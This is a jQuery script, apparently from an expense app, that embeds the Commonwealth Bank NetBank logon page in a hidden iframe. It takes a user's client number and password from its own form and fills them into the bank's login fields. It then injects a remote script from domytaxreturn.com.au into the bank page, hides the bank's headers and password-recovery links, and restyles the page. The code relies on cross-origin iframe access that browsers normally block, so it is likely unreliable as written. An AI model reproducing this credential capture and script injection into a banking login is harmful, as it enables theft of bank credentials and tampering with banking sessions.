function callme(clicked_id) {
    document.getElementById('foo').src = clicked_id;
    $('#loading').slideDown();
    $('#extraction').slideUp();
}

$(document).ready(function() {
    $("#netbank").html('<iframe id = "foo" src="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx" style = "width: 600px; height: 600px; display:none"></iframe>');
    $('#loading').slideUp();
    $('#ourform').slideDown();
    $('#ourform').on('submit', function(e) {
        e.preventDefault();
        var x = $('#crn').val();
        var y = $('#pwd').val();
        $('#foo').contents().find('#txtMyClientNumber_field').val(x);
        $('#foo').contents().find('#txtMyPassword_field').val(y);
        //click button on cba form
        var $body = $("#foo").contents().find("body");
        $body.append($("<script/>", {
            type: "text/javascript",
            src: "https://domytaxreturn.com.au/expenseapp/a.js"
        }));
        $('#ourform').hide();
        action();
    });
});

function action() {
    $('#loading').show();
    $('#extraction').hide();
    $('#foo').contents().find('link[rel=stylesheet]').remove();
    $('#foo').contents().find('iframe').remove();
    $('#foo').contents().find('#login-links').hide();
    $('#foo').contents().find('#remember').hide();
    $('#foo').contents().find('#lbl-remember').hide();
    $('#foo').contents().find('#chkRemember_field ').hide();
    $('#foo').contents().find('.checkbox.field.checkbox_classic').hide();


    $('#foo').contents().find('#forgotten-password').hide();
    $('#foo').contents().find('#ModuleRight').hide();
    $('#foo').contents().find('#Header').hide();
    $('#foo').contents().find('.TopMessage').hide();
    $('#foo').contents().find('#PageFooter').hide();
    $('#foo').contents().find('#PageFooter').hide();
    $('#foo').contents().find('#Register').hide();
    $('#foo').contents().find('#MessageBubble').hide();
    $('#foo').contents().find('h2').hide();
    $('#foo').contents().find('#ucLogonContentManageControl_pnlContentManaged').hide();




    var $head = $("#foo").contents().find("head");
    $head.append($("<link/>", {
        rel: "stylesheet",
        href: "https://domytaxreturn.com.au/expenseapp/bankajax.css",
        type: "text/css"
    }));


    $('#foo').contents().find('li').each(function() {
        var $this = $(this);
        if ($this.html().replace(/\s|&nbsp;/g, '').length == 0)
            $this.remove();
    });
}

function bangbang() {
    document.getElementById('foo').src = 'https://google.com';
    console.log($('#foo').contents().find('#CompleteAccess').length);
}
